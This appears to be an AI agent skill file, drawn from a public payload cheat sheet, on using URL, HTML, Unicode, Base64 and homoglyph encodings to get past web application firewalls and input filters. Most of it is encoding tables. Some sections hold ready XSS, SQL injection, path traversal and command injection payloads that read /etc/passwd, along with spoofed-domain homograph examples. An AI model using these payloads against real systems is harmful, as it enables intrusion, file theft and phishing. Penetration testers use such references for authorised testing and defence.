---
name: encoding
description: Encoding transformation techniques - URL, Unicode, Base64 for filter bypass. Use for WAF evasion.
---

# Encoding Transformations

## Description
Encoding and Transformations are techniques that change how data is represented or transferred without altering its core meaning. These techniques are essential for bypassing security filters, WAFs, and input validation mechanisms.

## Encoding Types

### 1. URL Encoding

Standard URL encoding replaces unsafe characters with `%` followed by hex value.

```
Space  = %20
!      = %21
"      = %22
#      = %23
$      = %24
%      = %25
&      = %26
'      = %27
(      = %28
)      = %29
*      = %2A
+      = %2B
,      = %2C
/      = %2F
:      = %3A
;      = %3B
<      = %3C
=      = %3D
>      = %3E
?      = %3F
@      = %40
[      = %5B
\      = %5C
]      = %5D
^      = %5E
`      = %60
{      = %7B
|      = %7C
}      = %7D
~      = %7E
```

### Double URL Encoding
```
Space  = %2520
<      = %253C
>      = %253E
"      = %2522
'      = %2527
/      = %252F
\      = %255C
.      = %252E
```

### 2. HTML Encoding

#### Named Entities
```
<      = &lt;
>      = &gt;
&      = &amp;
"      = &quot;
'      = &apos;
```

#### Decimal Entities
```
<      = &#60;
>      = &#62;
&      = &#38;
"      = &#34;
'      = &#39;
```

#### Hex Entities
```
<      = &#x3C;
>      = &#x3E;
&      = &#x26;
"      = &#x22;
'      = &#x27;
```

#### With Padding
```
<      = &#0000060;
<      = &#x0003C;
```

### 3. Unicode Encoding

#### Standard Unicode
```
<      = \u003C
>      = \u003E
'      = \u0027
"      = \u0022
```

#### CSS Unicode
```
<      = \3C
>      = \3E
'      = \27
"      = \22
```

#### JavaScript Unicode
```
<      = \u003c
>      = \u003e
'      = \u0027
"      = \u0022

// Octal
<      = \74
>      = \76
```

### 4. Base64 Encoding

```bash
# Encode
echo -n "payload" | base64
# cGF5bG9hZA==

# Decode
echo "cGF5bG9hZA==" | base64 -d
# payload
```

#### Base64 Character Set
```
A-Z (0-25)
a-z (26-51)
0-9 (52-61)
+ (62)
/ (63)
= (padding)
```

### 5. Hex Encoding

```bash
# Encode
echo -n "payload" | xxd -p
# 7061796c6f6164

# Decode
echo "7061796c6f6164" | xxd -r -p
# payload
```

### 6. Punycode

Used for internationalized domain names (IDN).

```
# Punycode prefix: xn--

# Cyrillic 'а' looks like Latin 'a'
pаypal.com  = xn--pypal-43d9g.com

# Homograph examples
аpple.com   = xn--pple-43d.com     (Cyrillic а)
goоgle.com  = xn--gogle-55e.com    (Cyrillic о)
```

## Unicode Normalization

### Normalization Forms

| Form | Description |
|------|-------------|
| NFC | Canonical Composition |
| NFD | Canonical Decomposition |
| NFKC | Compatibility Composition |
| NFKD | Compatibility Decomposition |

### Normalization Exploitation

```python
import unicodedata

# Character equivalence after normalization
char1 = "ﬁ"  # U+FB01 (ligature fi)
char2 = "fi" # Two separate characters

# After NFKC normalization, they become equal
unicodedata.normalize('NFKC', char1) == char2  # True
```

### Bypass Examples

```
# Path traversal with Unicode
..／etc/passwd    (U+FF0F Fullwidth Solidus)
‥/etc/passwd     (U+2025 Two Dot Leader)
︰/etc/passwd    (U+FE30 Presentation Form)

# SQL Injection with Unicode
＇ or 1=1--      (U+FF07 Fullwidth Apostrophe)
ʼ or 1=1--      (U+02BC Modifier Letter Apostrophe)
```

## Character Substitution

### Visually Similar Characters

| ASCII | Unicode Alternatives |
|-------|---------------------|
| ' | ʼ (U+02BC), ʻ (U+02BB), ' (U+2019), ＇ (U+FF07) |
| " | ＂ (U+FF02), " (U+201C), " (U+201D) |
| / | ／ (U+FF0F), ⁄ (U+2044), ∕ (U+2215) |
| \ | ＼ (U+FF3C), ⧵ (U+29F5), ∖ (U+2216) |
| < | ＜ (U+FF1C), ‹ (U+2039), ≺ (U+227A) |
| > | ＞ (U+FF1E), › (U+203A), ≻ (U+227B) |
| . | ． (U+FF0E), ․ (U+2024), ‧ (U+2027) |
| - | － (U+FF0D), – (U+2013), ─ (U+2500) |

### Homoglyph Attacks

```
# Latin 'a' vs Cyrillic 'а'
a = U+0061 (Latin)
а = U+0430 (Cyrillic)

# Latin 'o' vs Cyrillic 'о'
o = U+006F (Latin)
о = U+043E (Cyrillic)

# Latin 'e' vs Cyrillic 'е'
e = U+0065 (Latin)
е = U+0435 (Cyrillic)
```

## Filter Bypass Examples

### XSS Bypass
```javascript
// Using Unicode escapes
<script>alert\u0028'XSS'\u0029</script>

// Using HTML entities
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// Mixed encoding
<img src=x onerror="\u0061lert(1)">
```

### SQL Injection Bypass
```sql
-- Using fullwidth characters
１＝１
' OR ＇1＇=＇1

-- Unicode quotes
ʼ OR 1=1--

-- With MySQL character set
SELECT * FROM users WHERE name = 'café' -- equals 'cafe' in some collations
```

### Path Traversal Bypass
```
-- Fullwidth slash
..／..／etc／passwd

-- Two dot leader
‥/‥/etc/passwd

-- Unicode normalization
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Command Injection Bypass
```bash
# Using variable expansion
c${x}at /etc/passwd

# Using wildcards
/???/c?t /???/p?sswd

# Using encoding
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

## Tools

### CyberChef
```
https://gchq.github.io/CyberChef/
- Multiple encoding/decoding operations
- Recipe chaining
- Character analysis
```

### Python
```python
import urllib.parse
import html
import base64
import codecs

# URL encoding
urllib.parse.quote("payload")

# HTML encoding
html.escape("<script>")

# Base64
base64.b64encode(b"payload")

# Unicode
"payload".encode('unicode-escape')

# Hex
codecs.encode(b"payload", 'hex')
```

### Online Tools
```
- URL Encoder: https://www.urlencoder.org/
- HTML Encoder: https://www.freeformatter.com/html-entities.html
- Punycode: https://www.punycoder.com/
- Unicode: https://r12a.github.io/app-conversion/
```

## Practical Applications

### WAF Bypass
```http
# Original (blocked)
GET /search?q=<script>alert(1)</script>

# URL encoded
GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Double URL encoded
GET /search?q=%253Cscript%253Ealert(1)%253C/script%253E

# Unicode
GET /search?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E
```

### Input Validation Bypass
```python
# Bypass alphanumeric filter
# Instead of: ../
# Use: %2e%2e%2f or ..／ or ‥/
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Encoding%20Transformations
- https://www.compart.com/en/unicode
- https://unicode.org/reports/tr15/ (Unicode Normalization)
